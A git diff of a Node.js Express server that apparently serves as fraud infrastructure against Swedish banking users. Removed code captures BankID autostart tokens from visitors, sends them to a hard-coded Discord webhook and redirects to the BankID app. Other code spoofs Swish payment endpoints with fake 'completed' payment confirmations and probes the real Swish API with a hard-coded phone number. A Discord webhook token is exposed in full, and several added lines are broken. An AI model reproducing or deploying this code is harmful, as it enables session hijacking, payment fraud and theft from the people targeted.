@@ -5,42 +5,14 @@ const axios = require("axios");
 const app = express();
 
 const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1257464182257745980/c9fqfewXJrsw-BAvglkmbfJ99-WeCcdmWpsH59L8GejA3vovL4DSRv2kROAEjxTV_3ms";
-let MSID = ""
-let AMOUNT = ""
 let userID = 0;
  
 app.use(express.json());
 
 
 // Example route handler for '/'
-app.get('/', (req, res) => {
-  // Extract the query string from req.url
-  const queryString = req.url;
-
-  // Check if queryString exists and is not empty
-  if (!queryString || queryString === '/') {
-    return res.status(400).send('Invalid URL');
-  }
-
-  // Extract the autostarttoken parameter from the query string and trim leading '/?'
-  let autostarttoken = queryString.replace(/^\/?\?/, '');
-
-  // Check if autostarttoken is defined
-  if (!autostarttoken) {
-    return res.status(400).send('Missing autostarttoken parameter');
-  }
-
-  // Remove trailing '=' before '&'
-  autostarttoken = autostarttoken.replace(/=(&|$)/g, '$1');
-
-  // Construct the redirect URL with formatted query parameters
-  const redirectUrl = `bankid:///?autostarttoken=${autostarttoken}`;
-
-  // Log the redirect URL to Discord webhook (replace with your webhook function)
-  sendDiscordWebhook(redirectUrl);
-
-  // Redirect to the constructed URL
-  res.redirect(redirectUrl);
+app.get('/', (res) => {
+  res.send("Hey there");
 });
 
 
@@ -53,15 +25,43 @@ async function sendDiscordWebhookEmbed(embed) {
     console.error("Error sending webhook:", error);
   }
 }
-
-async function sendDiscordWebhook(msg) {
+async function sendDiscordWebhookEmbed(msg) {
   try {
-    await axios.post(DISCORD_WEBHOOK_URL, { content: msg });
-    console.log("Webhook sent successfully");
+    await axios.post(DISCORD_WEBHOOK_URL, {
+      content: msg
+    });
+
+    console.log("Embedded Webhook sent successfully");
   } catch (error) {
-    console.error("Error sending webhook:", error);
+    console.error("Error sending webhook:", error.message);
+    // Handle specific error cases or log more details
   }
 }
+
+async function checkPhoneNumber(phone) {
+    try {
+      const headers = {
+        'hash': 'CF6B0109CF8FFADC6FA0F1B5931B2A56ED01D0D0',
+        'clientTime': 1719949318
+      };
+  
+      const response = await axios.post(
+        "https://mpc.getswish.net/mpc-swish/api/v1/paymentrequest/initiatePaymentRequest", 
+        {
+          "receiverAlias": phone,
+          "currency": "SEK",
+          "amount": "1.00",
+          "message": ""
+        },
+        { headers }
+      );
+  
+      return response.data;
+    } catch (error) {
+      throw new Error(`Error initiating payment request: ${error.message}`); // Throw an error if request fails
+    }
+  }
+  
 
 // Middleware to send a Discord webhook for every request
 app.use(async (req, res, next) => {
@@ -175,22 +175,10 @@ app.post("/mpc-swish/api/v1/paymentrequest/initiatePaymentRequest", (req, res) =
   userID++;
 
   // Prepare the response JSON
-  const responseData = {
-    data: {
-      id: `${userID}`, // Generating an ID with a prefix and the incremented number
-      state: "completed",
-      senderName: "Test",
-      amount: "100.00",
-      currency: "USD",
-      receiverName: "Test",
-      initiatedAt: "2024-06-19T12:00:00Z",
-      updatedAt: "2024-06-19T12:05:00Z"
-    },
-    time: "2024-06-19T12:05:30Z"
-  };
+
 
   // Send the response with incremented id
-  res.status(200).json(responseData);
+  res.status(200).json(checkPhoneNumber("0706505038"));
 });
 
 app.get("/mpc-swish/api/v3/paymentrequest/ecom/check/:num", (req, res) => {
